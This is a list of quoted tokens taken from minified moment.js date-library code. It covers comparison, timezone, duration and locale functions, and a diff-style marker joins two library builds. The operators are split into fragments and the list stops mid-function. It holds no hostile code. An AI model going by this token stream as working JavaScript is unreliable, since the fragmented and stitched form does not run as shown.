"b", "=", "x", "(", "\"", "undefined", "\"", "!=", "typeof", "b", "?", "b", ":", "\"", "millisecond", "\"", "),", "\"", "millisecond", "\"", "==", "=", "b", "?", "(", "a", "=", "tb", ".", "isMoment", "(", "a", ")", "?", "a", ":", "tb", "(", "a", ")", ",+", "a", ">", "+", "this", ")", ":(", "c", "=", "tb", ".", "isMoment", "(", "a", ")", "?+", "a", ":", "+", "tb", "(", "a", ")", ",+", "this", ".", "clone", "(", ").", "endOf", "(", "b", ")", "<", "c", ")", "},", "isSame", ":", "function", "(", "a", ",", "b", ")", "{", "var", "c", ";", "return", "b", "=", "x", "(", "b", "|", "|\"", "millisecond", "\"", "),", "\"", "millisecond", "\"", "==", "=", "b", "?", "(", "a", "=", "tb", ".", "isMoment", "(", "a", ")", "?", "a", ":", "tb", "(", "a", ")", ",+", "this", "=", "==", "+", "a", ")", ":(", "c", "=", "+", "tb", "(", "a", ")", ",+", "this", ".", "clone", "(", ").", "startOf", "(", "b", ")", "<=", "c", "&", "&", "c", "<", "=+", "this", ".", "clone", "(", ").", "endOf", "(", "b", ")", ")}", ",", "min", ":", "f", "(", "\"", "moment", "(", ").", "min", "is", "deprecated", ",", "use", "moment", ".", "min", "instead", ".", "https", ":", "//", "github", ".", "com", "/", "moment", "/", "moment", "/", "issues", "/", "1548", "\"", ",", "function", "(", "a", ")", "{", "return", "a", "=", "tb", ".", "apply", "(", "null", ",", "arguments", ")", ",", "this", ">", "a", "?", "this", ":", "a", "}", "),", "max", ":", "f", "(", "\"", "moment", "(", ").", "max", "is", "deprecated", ",", "use", "moment", ".", "max", "instead", ".", "https", ":", "//", "github", ".", "com", "/", "moment", "/", "moment", "/", "issues", "/", "1548", "\"", ",", "function", "(", "a", ")", "{", "return", "a", "=", "tb", ".", "apply", "(", "null", ",", "arguments", ")", ",", "a", ">", "this", "?", "this", ":", "a", "}", "),", "zone", ":", "function", "(", "a", ",", "b", ")", "{", "var", "c", ",", "d", "=", "this", ".", "_offset", "|", "|", "0", ";", "return", "null", "=", "=", "a", "?", "this", ".", "_isUTC", "?", "d", ":", "this", ".", "_dateTzOffset", "(", "):", "(\"", "string", "\"", "==", "typeof", "a", "&", "&(", "a", "=", "Q", "(", "a", ")", "),", "Math", ".", "abs", "(", "a", ")", "<", "16", "&", "&(", "a", "=", "60", "*", "a", ")", ",!", "this", ".", "_isUTC", "&", "&", "b", "&", "&(", "c", "=", "this", ".", "_dateTzOffset", "(", "))", ",", "this", ".", "_offset", "=", "a", ",", "this", ".", "_isUTC", "=", "!", "0", ",", "null", "!", "=", "c", "&", "&", "this", ".", "subtract", "(", "c", ",", "\"", "m", "\"", "),", "d", "!", "==", "a", "&", "&(", "!", "b", "|", "|", "this", ".", "_changeInProgress", "?", "t", "(", "this", ",", "tb", ".", "duration", "(", "d", "-", "a", ",", "\"", "m", "\"", "),", "1", ",", "!", "1", ")", ":", "this", ".", "_changeInProgress", "|", "|(", "this", ".", "_changeInProgress", "=", "!", "0", ",", "tb", ".", "updateOffset", "(", "this", ",", "!", "0", ")", ",", "this", ".", "_changeInProgress", "=", "null", ")", "),", "this", ")", "},", "zoneAbbr", ":", "function", "(", "){", "return", "this", ".", "_isUTC", "?", "\"", "UTC", "\"", ":\"", "\"}", ",", "zoneName", ":", "function", "(", "){", "return", "this", ".", "_isUTC", "?", "\"", "Coordinated", "Universal", "Time", "\"", ":\"", "\"}", ",", "parseZone", ":", "function", "(", "){", "return", "this", ".", "_tzm", "?", "this", ".", "zone", "(", "this", ".", "_tzm", ")", ":\"", "string", "\"", "==", "typeof", "this", ".", "_i", "&", "&", "this", ".", "zone", "(", "this", ".", "_i", ")", ",", "this", "}", ",", "hasAlignedHourOffset", ":", "function", "(", "a", ")", "{", "return", "a", "=", "a", "?", "tb", "(", "a", ")", ".", "zone", "(", "):", "0", ",", "(", "this", ".", "zone", "(", ")-", "a", ")", "%", "60", "=", "==", "0", "}", ",", "daysInMonth", ":", "function", "(", "){", "return", "B", "(", "this", ".", "year", "(", "),", "this", ".", "month", "(", "))", "},", "dayOfYear", ":", "function", "(", "a", ")", "{", "var", "b", "=", "yb", "(", "(", "tb", "(", "this", ")", ".", "startOf", "(", "\"", "day", "\"", ")-", "tb", "(", "this", ")", ".", "startOf", "(", "\"", "year", "\"", "))", "/", "864e5", ")", "+", "1", ";", "return", "null", "=", "=", "a", "?", "b", ":", "this", ".", "add", "(", "a", "-", "b", ",", "\"", "d", "\"", ")}", ",", "quarter", ":", "function", "(", "a", ")", "{", "return", "null", "=", "=", "a", "?", "Math", ".", "ceil", "(", "(", "this", ".", "month", "(", ")+", "1", ")", "/", "3", ")", ":", "this", ".", "month", "(", "3", "*", "(", "a", "-", "1", ")", "+", "this", ".", "month", "(", ")%", "3", ")", "},", "weekYear", ":", "function", "(", "a", ")", "{", "var", "b", "=", "hb", "(", "this", ",", "this", ".", "localeData", "(", ").", "_week", ".", "dow", ",", "this", ".", "localeData", "(", ").", "_week", ".", "doy", ")", ".", "year", ";", "return", "null", "=", "=", "a", "?", "b", ":", "this", ".", "add", "(", "a", "-", "b", ",", "\"", "y", "\"", ")}", ",", "isoWeekYear", ":", "function", "(", "a", ")", "{", "var", "b", "=", "hb", "(", "this", ",", "1", ",", "4", ")", ".", "year", ";", "return", "null", "=", "=", "a", "?", "b", ":", "this", ".", "add", "(", "a", "-", "b", ",", "\"", "y", "\"", ")}", ",", "week", ":", "function", "(", "a", ")", "{", "var", "b", "=", "this", ".", "localeData", "(", ").", "week", "(", "this", ")", ";", "return", "null", "=", "=", "a", "?", "b", ":", "this", ".", "add", "(", "7", "*", "(", "a", "-", "b", ")", ",\"", "d", "\"", ")}", ",", "isoWeek", ":", "function", "(", "a", ")", "{", "var", "b", "=", "hb", "(", "this", ",", "1", ",", "4", ")", ".", "week", ";", "return", "null", "=", "=", "a", "?", "b", ":", "this", ".", "add", "(", "7", "*", "(", "a", "-", "b", ")", ",\"", "d", "\"", ")}", ",", "weekday", ":", "function", "(", "a", ")", "{", "var", "b", "=", "(", "this", ".", "day", "(", ")+", "7", "-", "this", ".", "localeData", "(", ").", "_week", ".", "dow", ")", "%", "7", ";", "return", "null", "=", "=", "a", "?", "b", ":", "this", ".", "add", "(", "a", "-", "b", ",", "\"", "d", "\"", ")}", ",", "isoWeekday", ":", "function", "(", "a", ")", "{", "return", "null", "=", "=", "a", "?", "this", ".", "day", "(", ")|", "|", "7", ":", "this", ".", "day", "(", "this", ".", "day", "(", ")%", "7", "?", "a", ":", "a", "-", "7", ")", "},", "isoWeeksInYear", ":", "function", "(", "){", "return", "C", "(", "this", ".", "year", "(", "),", "1", ",", "4", ")", "},", "weeksInYear", ":", "function", "(", "){", "var", "a", "=", "this", ".", "localeData", "(", ").", "_week", ";", "return", "C", "(", "this", ".", "year", "(", "),", "a", ".", "dow", ",", "a", ".", "doy", ")", "},", "get", ":", "function", "(", "a", ")", "{", "return", "a", "=", "x", "(", "a", ")", ",", "this", "[", "a", "]", "()", "},", "set", ":", "function", "(", "a", ",", "b", ")", "{", "return", "a", "=", "x", "(", "a", ")", ",\"", "function", "\"", "==", "typeof", "this", "[", "a", "]", "&&", "this", "[", "a", "]", "(", "b", ")", ",", "this", "}", ",", "locale", ":", "function", "(", "b", ")", "{", "var", "c", ";", "return", "b", "=", "==", "a", "?", "this", ".", "_locale", ".", "_abbr", ":", "(", "c", "=", "tb", ".", "localeData", "(", "b", ")", ",", "null", "!", "=", "c", "&", "&(", "this", ".", "_locale", "=", "c", ")", ",", "this", ")", "},", "lang", ":", "f", "(", "\"", "moment", "(", ").", "lang", "(", ")", "is", "deprecated", ".", "Instead", ",", "use", "moment", "(", ").", "localeData", "(", ")", "to", "get", "the", "language", "configuration", ".", "Use", "moment", "(", ").", "locale", "(", ")", "to", "change", "languages", ".", "\",", "function", "(", "b", ")", "{", "return", "b", "=", "==", "a", "?", "this", ".", "localeData", "(", "):", "this", ".", "locale", "(", "b", ")", "})", ",", "localeData", ":", "function", "(", "){", "return", "this", ".", "_locale", "}", ",", "_dateTzOffset", ":", "function", "(", "){", "return", "15", "*", "Math", ".", "round", "(", "this", ".", "_d", ".", "getTimezoneOffset", "(", ")/", "15", ")", "}}", "),", "tb", ".", "fn", ".", "millisecond", "=", "tb", ".", "fn", ".", "milliseconds", "=", "ob", "(", "\"", "Milliseconds", "\"", ",!", "1", ")", ",", "tb", ".", "fn", ".", "second", "=", "tb", ".", "fn", ".", "seconds", "=", "ob", "(", "\"", "Seconds", "\"", ",!", "1", ")", ",", "tb", ".", "fn", ".", "minute", "=", "tb", ".", "fn", ".", "minutes", "=", "ob", "(", "\"", "Minutes", "\"", ",!", "1", ")", ",", "tb", ".", "fn", ".", "hour", "=", "tb", ".", "fn", ".", "hours", "=", "ob", "(", "\"", "Hours", "\"", ",!", "0", ")", ",", "tb", ".", "fn", ".", "date", "=", "ob", "(", "\"", "Date", "\"", ",!", "0", ")", ",", "tb", ".", "fn", ".", "dates", "=", "f", "(", "\"", "dates", "accessor", "is", "deprecated", ".", "Use", "date", "instead", ".", "\",", "ob", "(", "\"", "Date", "\"", ",!", "0", ")", "),", "tb", ".", "fn", ".", "year", "=", "ob", "(", "\"", "FullYear", "\"", ",!", "0", ")", ",", "tb", ".", "fn", ".", "years", "=", "f", "(", "\"", "years", "accessor", "is", "deprecated", ".", "Use", "year", "instead", ".", "\",", "ob", "(", "\"", "FullYear", "\"", ",!", "0", ")", "),", "tb", ".", "fn", ".", "days", "=", "tb", ".", "fn", ".", "day", ",", "tb", ".", "fn", ".", "months", "=", "tb", ".", "fn", ".", "month", ",", "tb", ".", "fn", ".", "weeks", "=", "tb", ".", "fn", ".", "week", ",", "tb", ".", "fn", ".", "isoWeeks", "=", "tb", ".", "fn", ".", "isoWeek", ",", "tb", ".", "fn", ".", "quarters", "=", "tb", ".", "fn", ".", "quarter", ",", "tb", ".", "fn", ".", "toJSON", "=", "tb", ".", "fn", ".", "toISOString", ",", "m", "(", "tb", ".", "duration", ".", "fn", "=", "l", ".", "prototype", ",", "{", "_bubble", ":", "function", "(", "){", "var", "a", ",", "b", ",", "c", ",", "d", "=", "this", ".", "_milliseconds", ",", "e", "=", "this", ".", "_days", ",", "f", "=", "this", ".", "_months", ",", "g", "=", "this", ".", "_data", ",", "h", "=", "0", ";", "g", ".", "milliseconds", "=", "d", "%", "1e3", ",", "a", "=", "o", "(", "d", "/", "1e3", ")", ",", "g", ".", "seconds", "=", "a", "%", "60", ",", "b", "=", "o", "(", "a", "/", "60", ")", ",", "g", ".", "minutes", "=", "b", "%", "60", ",", "c", "=", "o", "(", "b", "/", "60", ")", ",", "g", ".", "hours", "=", "c", "%", "24", ",", "e", "+", "=", "o", "(", "c", "/", "24", ")", ",", "h", "=", "o", "(", "pb", "(", "e", ")", "),", "e", "-", "=", "o", "(", "qb", "(", "h", ")", "),", "f", "+", "=", "o", "(", "e", "/", "30", ")", ",", "e", "%", "=", "30", ",", "h", "+", "=", "o", "(", "f", "/", "12", ")", ",", "f", "%", "=", "12", ",", "g", ".", "days", "=", "e", ",", "g", ".", "months", "=", "f", ",", "g", ".", "years", "=", "h", "}", ",", "abs", ":", "function", "(", "){", "return", "this", ".", "_milliseconds", "=", "Math", ".", "abs", "(", "this", ".", "_milliseconds", ")", ",", "this", ".", "_days", "=", "Math", ".", "abs", "(", "this", ".", "_days", ")", ",", "this", ".", "_months", "=", "Math", ".", "abs", "(", "this", ".", "_months", ")", ",", "this", ".", "_data", ".", "milliseconds", "=", "Math", ".", "abs", "(", "this", ".", "_data", ".", "milliseconds", ")", ",", "this", ".", "_data", ".", "seconds", "=", "Math", ".", "abs", "(", "this", ".", "_data", ".", "seconds", ")", ",", "this", ".", "_data", ".", "minutes", "=", "Math", ".", "abs", "(", "this", ".", "_data", ".", "minutes", ")", ",", "this", ".", "_data", ".", "hours", "=", "Math", ".", "abs", "(", "this", ".", "_data", ".", "hours", ")", ",", "this", ".", "_data", ".", "months", "=", "Math", ".", "abs", "(", "this", ".", "_data", ".", "months", ")", ",", "this", ".", "_data", ".", "years", "=", "Math", ".", "abs", "(", "this", ".", "_data", ".", "years", ")", ",", "this", "}", ",", "weeks", ":", "function", "(", "){", "return", "o", "(", "this", ".", "days", "(", ")/", "7", ")", "},", "valueOf", ":", "function", "(", "){", "return", "this", ".", "_milliseconds", "+", "864e5", "*", "this", ".", "_days", "+", "this", ".", "_months", "%", "12", "*", "2592e6", "+", "31536e6", "*", "A", "(", "this", ".", "_months", "/", "12", ")", "},", "humanize", ":", "function", "(", "a", ")", "{", "var", "b", "=", "gb", "(", "this", ",", "!", "a", ",", "this", ".", "localeData", "(", "))", ";", "return", "a", "&", "&(", "b", "=", "this", ".", "localeData", "(", ").", "pastFuture", "(", "+", "this", ",", "b", ")", "),", "this", ".", "localeData", "(", ").", "postformat", "(", "b", ")", "},", "add", ":", "function", "(", "a", ",", "b", ")", "{", "var", "c", "=", "tb", ".", "duration", "(", "a", ",", "b", ")", ";", "return", "this", ".", "_milliseconds", "+", "=", "c", ".", "_milliseconds", ",", "this", ".", "_days", "+", "=", "c", ".", "_days", ",", "this", ".", "_months", "+", "=", "c", ".", "_months", ",", "this", ".", "_bubble", "(", "),", "this", "}", ",", "subtract", ":", "function", "(", "a", ",", "b", ")", "{", "var", "c", "=", "tb", ".", "duration", "(", "a", ",", "b", ")", ";", "return", "this", ".", "_milliseconds", "-", "=", "c", ".", "_milliseconds", ",", "this", ".", "_days", "-", "=", "c", ".", "_days", ",", "this", ".", "_months", "-", "=", "c", ".", "_months", ",", "this", ".", "_bubble", "(", "),", "this", "}", ",", "get", ":", "function", "(", "a", ")", "{", "return", "a", "=", "x", "(", "a", ")", ",", "this", "[", "a", ".", "toLowerCase", "(", ")+", "\"", "s", "\"", "](", ")}", ",", "as", ":", "function", "(", "a", ")", "{", "var", "b", ",", "c", ";", "if", "(", "a", "=", "x", "(", "a", ")", ",\"", "month", "\"", "==", "=", "a", "|", "|\"", "year", "\"", "==", "=", "a", ")", "return", "b", "=", "this", ".", "_days", "+", "this", ".", "_milliseconds", "/", "864e5", ",", "c", "=", "this", ".", "_months", "+", "12", "*", "pb", "(", "b", ")", ",\"", "month", "\"", "==", "=", "a", "?", "c", ":", "c", "/", "12", ";", "switch", "(", "b", "=", "this", ".", "_days", "+", "Math", ".", "round", "(", "qb", "(", "this", ".", "_months", "/", "12", ")", "),", "a", ")", "{", "case", "\"", "week", "\"", ":", "return", "b", "/", "7", "+", "this", ".", "_milliseconds", "/", "6048e5", ";", "case", "\"", "day", "\"", ":", "return", "b", "+", "this", ".", "_milliseconds", "/", "864e5", ";", "case", "\"", "hour", "\"", ":", "return", "24", "*", "b", "+", "this", ".", "_milliseconds", "/", "36e5", ";", "case", "\"", "minute", "\"", ":", "return", "24", "*", "b", "*", "60", "+", "this", ".", "_milliseconds", "/", "6e4", ";", "case", "\"", "second", "\"", ":", "return", "24", "*", "b", "*", "60", "*", "60", "+", "this", ".", "_milliseconds", "/", "1e3", ";", "case", "\"", "millisecond", "\"", ":", "return", "Math", ".", "floor", "(", "24", "*", "b", "*", "60", "*", "60", "*", "1e3", ")", "+", "this", ".", "_milliseconds", ";", "default", ":", "throw", "new", "Error", "(", "\"", "Unknown", "unit", "\"", "+", "a", ")", "}}", ",", "lang", ":", "tb", ".", "fn", ".", "lang", ",", "locale", ":", "tb", ".", "fn", ".", "locale", ",", "toIsoString", ":", "f", "(", "\"", "toIsoString", "(", ")", "is", "deprecated", ".", "Please", "use", "toISOString", "(", ")", "instead", "(", "notice", "the", "capitals", ")", "\",", "function", "(", "){", "return", "this", ".", "toISOString", "(", ")}", "),", "toISOString", ":", "function", "(", "){", "var", "a", "=", "Math", ".", "abs", "(", "this", ".", "years", "(", "))", ",", "b", "=", "Math", ".", "abs", "(", "this", ".", "months", "(", "))", ",", "c", "=", "Math", ".", "abs", "(", "this", ".", "days", "(", "))", ",", "d", "=", "Math", ".", "abs", "(", "this", ".", "hours", "(", "))", ",", "e", "=", "Math", ".", "abs", "(", "this", ".", "minutes", "(", "))", ",", "f", "=", "Math", ".", "abs", "(", "this", ".", "seconds", "(", ")+", "this", ".", "milliseconds", "(", ")/", "1e3", ")", ";", "return", "this", ".", "asSeconds", "(", ")?", "(", "this", ".", "asSeconds", "(", ")<", "0", "?", "\"-", "\":", "\"\"", ")+", "\"", "P", "\"", "+(", "a", "?", "a", "+", "\"", "Y", "\"", ":\"", "\")", "+(", "b", "?", "b", "+", "\"", "M", "\"", ":\"", "\")", "+(", "c", "?", "c", "+", "\"", "D", "\"", ":\"", "\")", "+(", "d", "|", "|", "e", "|", "|", "f", "?", "\"", "T", "\"", ":\"", "\")", "+(", "d", "?", "d", "+", "\"", "H", "\"", ":\"", "\")", "+(", "e", "?", "e", "+", "\"", "M", "\"", ":\"", "\")", "+(", "f", "?", "f", "+", "\"", "S", "\"", ":\"", "\")", ":\"", "P0D", "\"", "},", "localeData", ":", "function", "(", "){", "return", "this", ".", "_locale", "}", "})", ",", "tb", ".", "duration", ".", "fn", ".", "toString", "=", "tb", ".", "duration", ".", "fn", ".", "toISOString", ";", "for", "(", "vb", "in", "ic", ")", "c", "(", "ic", ",", "vb", ")", "&&", "rb", "(", "vb", ".", "toLowerCase", "(", "))", ";", "tb", ".", "duration", ".", "fn", ".", "asMilliseconds", "=", "function", "(", "){", "return", "this", ".", "as", "(", "\"", "ms", "\"", ")}", ",", "tb", ".", "duration", ".", "fn", ".", "asSeconds", "=", "function", "(", "){", "return", "this", ".", "as", "(", "\"", "s", "\"", ")}", ",", "tb", ".", "duration", ".", "fn", ".", "asMinutes", "=", "function", "(", "){", "return", "this", ".", "as", "(", "\"", "m", "\"", ")}", ",", "tb", ".", "duration", ".", "fn", ".", "asHours", "=", "function", "(", "){", "return", "this", ".", "as", "(", "\"", "h", "\"", ")}", ",", "tb", ".", "duration", ".", "fn", ".", "asDays", "=", "function", "(", "){", "return", "this", ".", "as", "(", "\"", "d", "\"", ")}", ",", "tb", ".", "duration", ".", "fn", ".", "asWeeks", "=", "function", "(", "){", "return", "this", ".", "as", "(", "\"", "weeks", "\"", ")}", ",", "tb", ".", "duration", ".", "fn", ".", "asMonths", "=", "function", "(", "){", "return", "this", ".", "as", "(", "\"", "M", "\"", ")}", ",", "tb", ".", "duration", ".", "fn", ".", "asYears", "=", "function", "(", "){", "return", "this", ".", "as", "(", "\"", "y", "\"", ")}", ",", "tb", ".", "locale", "(", "\"", "en", "\"", ",{", "ordinalParse", ":", "/\\", "d", "{", "1", ",", "2", "}", "(", "th", "|", "st", "|", "nd", "|", "rd", ")", "/,", "ordinal", ":", "function", "(", "a", ")", "{", "var", "b", "=", "a", "%", "10", ",", "c", "=", "1", "=", "==", "A", "(", "a", "%", "100", "/", "10", ")", "?\"", "th", "\"", ":", "1", "=", "==", "b", "?", "\"", "st", "\"", ":", "2", "=", "==", "b", "?", "\"", "nd", "\"", ":", "3", "=", "==", "b", "?", "\"", "rd", "\"", ":\"", "th", "\"", ";", "return", "a", "+", "c", "}", "})", ",", "Jb", "?", "module", ".", "exports", "=", "tb", ":", "\"", "function", "\"", "==", "typeof", "define", "&", "&", "define", ".", "amd", "?", "(", "define", "(", "\"", "moment", "\"", ",", "function", "(", "a", ",", "b", ",", "c", ")", "{", "return", "c", ".", "config", "&", "&", "c", ".", "config", "(", ")&", "&", "c", ".", "config", "(", ").", "noGlobal", "=", "==", "!", "0", "&", "&(", "xb", ".", "moment", "=", "ub", ")", ",", "tb", "}", "),", "sb", "(", "!", "0", ")", "):", "sb", "(", ")}", ").", "call", "(", "this", ")", ";", "\\", "No", "newline", "at", "end", "of", "file", "!", "function", "(", "e", ",", "t", ")", "{\"", "object", "\"", "==", "typeof", "exports", "&", "&\"", "undefined", "\"", "!=", "typeof", "module", "?", "module", ".", "exports", "=", "t", "(", "):", "\"", "function", "\"", "==", "typeof", "define", "&", "&", "define", ".", "amd", "?", "define", "(", "t", ")", ":", "e", ".", "moment", "=", "t", "(", ")}", "(", "this", ",", "function", "(", "){", "\"", "use", "strict", "\"", ";", "function", "e", "(", "){", "return", "Qe", ".", "apply", "(", "null", ",", "arguments", ")", "}", "function", "t", "(", "e", ")", "{", "return", "e", "instanceof", "Array", "|", "|\"", "[", "object", "Array", "]", "\"=", "==", "Object", ".", "prototype", ".", "toString", ".", "call", "(", "e", ")", "}", "function", "n", "(", "e", ")", "{", "return", "null", "!", "=", "e", "&", "&\"", "[", "object", "Object", "]", "\"=", "==", "Object", ".", "prototype", ".", "toString", ".", "call", "(", "e", ")", "}", "function", "s", "(", "e", ")", "{", "return", "void", "0", "=", "==", "e", "}", "function", "i", "(", "e", ")", "{", "return", "\"", "number", "\"", "==", "typeof", "e", "|", "|\"", "[", "object", "Number", "]", "\"=", "==", "Object", ".", "prototype", ".", "toString", ".", "call", "(", "e", ")", "}", "function", "r", "(", "e", ")", "{", "return", "e", "instanceof", "Date", "|", "|\"", "[", "object", "Date", "]", "\"=", "==", "Object", ".", "prototype", ".", "toString", ".", "call", "(", "e", ")", "}", "function", "a", "(", "e", ",", "t", ")", "{", "var", "n", ",", "s", "=", "[]", ";", "for", "(", "n", "=", "0", ";", "n", "<", "e", ".", "length", ";", "++", "n", ")", "s", ".", "push", "(", "t", "(", "e", "[", "n", "]", ",", "n", ")", ");", "return", "s", "}", "function", "o", "(", "e", ",", "t", ")", "{", "return", "Object", ".", "prototype", ".", "hasOwnProperty", ".", "call", "(", "e", ",", "t", ")", "}", "function", "u", "(", "e", ",", "t", ")", "{", "for", "(", "var", "n", "in", "t", ")", "o", "(", "t", ",", "n", ")", "&&", "(", "e", "[", "n", "]", "=", "t", "[", "n", "]", ");", "return", "o", "(", "t", ",", "\"", "toString", "\"", ")&", "&(", "e", ".", "toString", "=", "t", ".", "toString", ")", ",", "o", "(", "t", ",", "\"", "valueOf", "\"", ")&", "&(", "e", ".", "valueOf", "=", "t", ".", "valueOf", ")", ",", "e", "}", "function", "l", "(", "e", ",", "t", ",", "n", ",", "s", ")", "{", "return", "ge", "(", "e", ",", "t", ",", "n", ",", "s", ",", "!", "0", ")", ".", "utc", "(", ")}", "function", "d", "(", "e", ")", "{", "return", "null", "=", "=", "e", ".", "_pf", "&", "&(", "e", ".", "_pf", "=", "{", "empty", ":", "!", "1", ",", "unusedTokens", ":", "[]", ",", "unusedInput", ":", "[]", ",", "overflow", ":", "-", "2", ",", "charsLeftOver", ":", "0", ",", "nullInput", ":", "!", "1", ",", "invalidMonth", ":", "null", ",", "invalidFormat", ":", "!", "1", ",", "userInvalidated", ":", "!", "1", ",", "iso", ":", "!", "1", ",", "parsedDateParts", ":", "[]", ",", "meridiem", ":", "null", ",", "rfc2822", ":", "!", "1", ",", "weekdayMismatch", ":", "!", "1", "}", "),", "e", ".", "_pf", "}", "function", "h", "(", "e", ")", "{", "if", "(", "null", "=", "=", "e", ".", "_isValid", ")", "{", "var", "t", "=", "d", "(", "e", ")", ",", "n", "=", "Xe", ".", "call", "(", "t", ".", "parsedDateParts", ",", "function", "(", "e", ")", "{", "return", "null", "!", "=", "e", "}", "),", "s", "=", "!", "isNaN", "(", "e", ".", "_d", ".", "getTime", "(", "))", "&&", "t", ".", "overflow", "<", "0", "&", "&!", "t", ".", "empty", "&", "&!", "t", ".", "invalidMonth", "&", "&!", "t", ".", "invalidWeekday", "&", "&!", "t", ".", "weekdayMismatch", "&", "&!", "t", ".", "nullInput", "&", "&!", "t", ".", "invalidFormat", "&", "&!", "t", ".", "userInvalidated", "&", "&(", "!", "t", ".", "meridiem", "|", "|", "t", ".", "meridiem", "&", "&", "n", ")", ";", "if", "(", "e", ".", "_strict", "&", "&(", "s", "=", "s", "&", "&", "0", "=", "==", "t", ".", "charsLeftOver", "&", "&", "0", "=", "==", "t", ".", "unusedTokens", ".", "length", "&", "&", "void", "0", "=", "==", "t", ".", "bigHour", ")", ",", "null", "!", "=", "Object", ".", "isFrozen", "&", "&", "Object", ".", "isFrozen", "(", "e", ")", ")", "return", "s", ";", "e", ".", "_isValid", "=", "s", "}", "return", "e", ".", "_isValid", "}", "function", "c", "(", "e", ")", "{", "var", "t", "=", "l", "(", "NaN", ")", ";", "return", "null", "!", "=", "e", "?", "u", "(", "d", "(", "t", ")", ",", "e", ")", ":", "d", "(", "t", ")", ".", "userInvalidated", "=", "!", "0", ",", "t", "}", "function", "f", "(", "e", ",", "t", ")", "{", "var", "n", ",", "i", ",", "r", ";", "if", "(", "s", "(", "t", ".", "_isAMomentObject", ")", "||", "(", "e", ".", "_isAMomentObject", "=", "t", ".", "_isAMomentObject", ")", ",", "s", "(", "t", ".", "_i", ")", "||", "(", "e", ".", "_i", "=", "t", ".", "_i", ")", ",", "s", "(", "t", ".", "_f", ")", "||", "(", "e", ".", "_f", "=", "t", ".", "_f", ")", ",", "s", "(", "t", ".", "_l", ")", "||", "(", "e", ".", "_l", "=", "t", ".", "_l", ")", ",", "s", "(", "t", ".", "_strict", ")", "||", "(", "e", ".", "_strict", "=", "t", ".", "_strict", ")", ",", "s", "(", "t", ".", "_tzm", ")", "||", "(", "e", ".", "_tzm", "=", "t", ".", "_tzm", ")", ",", "s", "(", "t", ".", "_isUTC", ")", "||", "(", "e", ".", "_isUTC", "=", "t", ".", "_isUTC", ")", ",", "s", "(", "t", ".", "_offset", ")", "||", "(", "e", ".", "_offset", "=", "t", ".", "_offset", ")", ",", "s", "(", "t", ".", "_pf", ")", "||", "(", "e", ".", "_pf", "=", "d", "(", "t", ")", "),", "s", "(", "t", ".", "_locale", ")", "||", "(", "e", ".", "_locale", "=", "t", ".", "_locale", ")", ",", "Ke", ".", "length", ">", "0", ")", "for", "(", "n", "=", "0", ";", "n", "<", "Ke", ".", "length", ";", "n", "+", "+)", "s", "(", "r", "=", "t", "[", "i", "=", "Ke", "[", "n", "]", "])", "||", "(", "e", "[", "i", "]", "=", "r", ")", ";", "return", "e", "}", "function", "m", "(", "t", ")", "{", "f", "(", "this", ",", "t", ")", ",", "this", ".", "_d", "=", "new", "Date", "(", "null", "!", "=", "t", ".", "_d", "?", "t", ".", "_d", ".", "getTime", "(", "):", "NaN", ")", ",", "this", ".", "isValid", "(", ")|", "|(", "this", ".", "_d", "=", "new", "Date", "(", "NaN", ")", "),", "!", "1", "=", "==", "et", "&", "&(", "et", "=", "!", "0", ",", "e", ".", "updateOffset", "(", "this", ")", ",", "et", "=", "!", "1", ")", "}", "function", "_", "(", "e", ")", "{", "return", "e", "instanceof", "m", "|", "|", "null", "!", "=", "e", "&", "&", "null", "!", "=", "e", ".", "_isAMomentObject", "}", "function", "y", "(", "e", ")", "{", "return", "e", "<", "0", "?", "Math", ".", "ceil", "(", "e", ")", "||", "0", ":", "Math", ".", "floor", "(", "e", ")", "}", "function", "g", "(", "e", ")", "{", "var", "t", "=", "+", "e", ",", "n", "=", "0", ";", "return", "0", "!", "==", "t", "&", "&", "isFinite", "(", "t", ")", "&&", "(", "n", "=", "y", "(", "t", ")", "),", "n", "}", "function", "p", "(", "e", ",", "t", ",", "n", ")", "{", "var", "s", ",", "i", "=", "Math", ".", "min", "(", "e", ".", "length", ",", "t", ".", "length", ")", ",", "r", "=", "Math", ".", "abs", "(", "e", ".", "length", "-", "t", ".", "length", ")", ",", "a", "=", "0", ";", "for", "(", "s", "=", "0", ";", "s", "<", "i", ";", "s", "+", "+)", "(", "n", "&", "&", "e", "[", "s", "]", "!=", "=", "t", "[", "s", "]", "||", "!", "n", "&", "&", "g", "(", "e", "[", "s", "]", ")!", "==", "g", "(", "t", "[", "s", "]", "))", "&&", "a", "+", "+;", "return", "a", "+", "r", "}", "function", "w", "(", "t", ")", "{!", "1", "=", "==", "e", ".", "suppressDeprecationWarnings", "&", "&\"", "undefined", "\"", "!=", "typeof", "console", "&", "&", "console", ".", "warn", "&", "&", "console", ".", "warn", "(", "\"", "Deprecation", "warning", ":", "\"", "+", "t", ")", "}", "function", "v", "(", "t", ",", "n", ")", "{", "var", "s", "=", "!", "0", ";", "return", "u", "(", "function", "(", "){", "if", "(", "null", "!", "=", "e", ".", "deprecationHandler", "&", "&", "e", ".", "deprecationHandler", "(", "null", ",", "t", ")", ",", "s", ")", "{", "for", "(", "var", "i", ",", "r", "=", "[]", ",", "a", "=", "0", ";", "a", "<", "arguments", ".", "length", ";", "a", "+", "+)", "{", "if", "(", "i", "=", "\"\"", ",\"", "object", "\"", "==", "typeof", "arguments", "[", "a", "]", "){", "i", "+", "=\"", "\\", "n", "[", "\"+", "a", "+", "\"]", "\"", ";", "for", "(", "var", "o", "in", "arguments", "[", "0", "]", ")", "i", "+", "=", "o", "+", "\":", "\"", "+", "arguments", "[", "0", "]", "[", "o", "]", "+\"", ",", "\"", ";", "i", "=", "i", ".", "slice", "(", "0", ",", "-", "2", ")", "}", "else", "i", "=", "arguments", "[", "a", "]", ";", "r", ".", "push", "(", "i", ")", "}", "w", "(", "t", "+", "\"\\", "nArguments", ":", "\"", "+", "Array", ".", "prototype", ".", "slice", ".", "call", "(", "r", ")", ".", "join", "(", "\"\"", ")+", "\"\\", "n", "\"", "+(", "new", "Error", ")", ".", "stack", ")", ",", "s", "=", "!", "1", "}", "return", "n", ".", "apply", "(", "this", ",", "arguments", ")", "},", "n", ")", "}", "function", "M", "(", "t", ",", "n", ")", "{", "null", "!", "=", "e", ".", "deprecationHandler", "&", "&", "e", ".", "deprecationHandler", "(", "t", ",", "n", ")", ",", "tt", "[", "t", "]", "||", "(", "w", "(", "n", ")", ",", "tt", "[", "t", "]", "=!", "0", ")", "}", "function", "k", "(", "e", ")", "{", "return", "e", "instanceof", "Function", "|", "|\"", "[", "object", "Function", "]", "\"=", "==", "Object", ".", "prototype", ".", "toString", ".", "call", "(", "e", 